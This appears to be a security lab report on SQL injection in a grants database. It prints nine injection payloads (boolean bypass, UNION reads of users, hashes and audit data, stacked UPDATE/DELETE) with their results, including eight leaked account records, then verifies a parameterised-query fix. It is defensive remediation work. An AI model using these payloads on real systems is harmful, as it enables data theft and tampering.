@@ -1,0 +1,75 @@
+SQL INJECTION LAB - 2026-11-17T19:47:53Z - database grants_test, account grants_app, acting as researcher amina.elidrissi@uni.example
+The unsafe query: SELECT id, title FROM proposals WHERE owner_id = <actor> AND title ILIKE '%<INPUT>%'
+The fixed query : the same statement with the value bound as a parameter ($2).
+
+== 1. BEFORE remediation: the unsafe query, six data-theft payloads and three tampering payloads
+A1  boolean bypass of the filter
+    payload : ' OR TRUE -- 
+    result  : 15 rows returned
+A2  UNION: read every account (users table)
+    payload : zz%' UNION SELECT id, email || ' | ' || full_name || ' | ' || role FROM users -- 
+    result  : 8 rows returned
+      leaked: amina.elidrissi@uni.example | Dr. Amina El Idrissi | researcher
+      leaked: youssef.benali@uni.example | Dr. Youssef Benali | researcher
+      leaked: salma.tazi@uni.example | Prof. Salma Tazi | reviewer
+      leaked: karim.ouazzani@uni.example | Prof. Karim Ouazzani | reviewer
+      leaked: nadia.berrada@uni.example | Nadia Berrada | officer
+      leaked: omar.chraibi@uni.example | Omar Chraibi | auditor
+      leaked: rachid.fixture@uni.example | Dr. Rachid Fixture | reviewer
+      leaked: newofficer.fixture@uni.example | Fixture Officer | officer
+A3  UNION: read password hashes
+    payload : zz%' UNION SELECT id, password_hash FROM users -- 
+    result  : REFUSED by the database - 42501 SQLSTATE[42501]: Insufficient privilege: 7 ERROR: permission denied for table users
+A4  UNION: read the audit trail
+    payload : zz%' UNION SELECT id, action || ' ' || coalesce(details::text, '') FROM audit_events -- 
+    result  : REFUSED by the database - 42501 SQLSTATE[42501]: Insufficient privilege: 7 ERROR: permission denied for table audit_events
+A5  UNION: read other researchers' proposals
+    payload : zz%' UNION SELECT id, title FROM proposals WHERE owner_id <> 1 -- 
+    result  : 0 rows returned
+A6  UNION: read confidential review comments
+    payload : zz%' UNION SELECT id, comments_enc FROM reviews -- 
+    result  : 0 rows returned
+A7  stacked statement: lock the officers out
+    payload : zz%'; UPDATE users SET locked_until = now() + interval '1 day' WHERE role = 'officer'; -- 
+    result  : REFUSED by the database - 42601 SQLSTATE[42601]: Syntax error: 7 ERROR: cannot insert multiple commands into a prepared statement
+A8  stacked statement: erase decisions
+    payload : zz%'; DELETE FROM decisions; -- 
+    result  : REFUSED by the database - 42601 SQLSTATE[42601]: Syntax error: 7 ERROR: cannot insert multiple commands into a prepared statement
+A9  stacked statement: give myself money
+    payload : zz%'; UPDATE grant_calls SET remaining_budget = 0; -- 
+    result  : REFUSED by the database - 42601 SQLSTATE[42601]: Syntax error: 7 ERROR: cannot insert multiple commands into a prepared statement
+
+A7-A9 were stopped by server-side prepared statements. Second barrier: the same three statements sent as if stacking had worked (simple protocol, exec()):
+A7  UPDATE users SET locked_until = now() + interval '1 day' WHERE role = 'officer' -> REFUSED 42501 (no privilege)
+A8  DELETE FROM decisions                                                  -> REFUSED 42501 (no privilege)
+A9  UPDATE grant_calls SET remaining_budget = 0                            -> REFUSED 42501 (no privilege)
+
+IMPACT (what the attacker obtained) : 8 accounts (e-mail, full name, role) - {"auditor":1,"officer":2,"researcher":2,"reviewer":3}, including every officer and the auditor.
+   A researcher should see none of them. This is a confidentiality breach and a map for targeted phishing and account attacks.
+IMPACT LIMITED BY LEAST PRIVILEGE   : password hashes (A3), the audit trail (A4), other researchers' proposals (A5, RLS),
+   and review comments (A6, RLS: no policy for researchers) were NOT obtainable; all three tampering payloads (A7-A9) failed,
+   so the same injection cannot lock accounts, erase decisions or change budgets.
+
+== 2. ROOT CAUSE
+   The statement text is built from user input, so input can change the grammar of the statement (quote, UNION, comment).
+   Escaping lists or blacklists do not fix this; the database must receive the statement and the data separately.
+
+== 3. AFTER remediation: the SAME nine payloads through the parameterised query
+A1  boolean bypass of the filter                         -> 0 rows, no error: treated as a harmless search text
+A2  UNION: read every account (users table)              -> 0 rows, no error: treated as a harmless search text
+A3  UNION: read password hashes                          -> 0 rows, no error: treated as a harmless search text
+A4  UNION: read the audit trail                          -> 0 rows, no error: treated as a harmless search text
+A5  UNION: read other researchers' proposals             -> 0 rows, no error: treated as a harmless search text
+A6  UNION: read confidential review comments             -> 0 rows, no error: treated as a harmless search text
+A7  stacked statement: lock the officers out             -> 0 rows, no error: treated as a harmless search text
+A8  stacked statement: erase decisions                   -> 0 rows, no error: treated as a harmless search text
+A9  stacked statement: give myself money                 -> 0 rows, no error: treated as a harmless search text
+     legitimate input containing an apostrophe ("Children's") -> 1 row(s), no error
+     empty search -> 15 rows, all owned by the actor (RLS unchanged)
+
+== 4. WHY THE FIX WORKS
+   * With bound parameters the statement is parsed first; the input can only ever be a value, never SQL.
+   * Server-side prepared statements (PDO::ATTR_EMULATE_PREPARES=false) also refuse stacked statements: see the A7-A9 result in section 1.
+   * Defence in depth held even while the code was vulnerable: column privileges, RLS and the missing UPDATE/DELETE grants capped the damage.
+
+RESULT: vulnerability demonstrated, then no longer exploitable
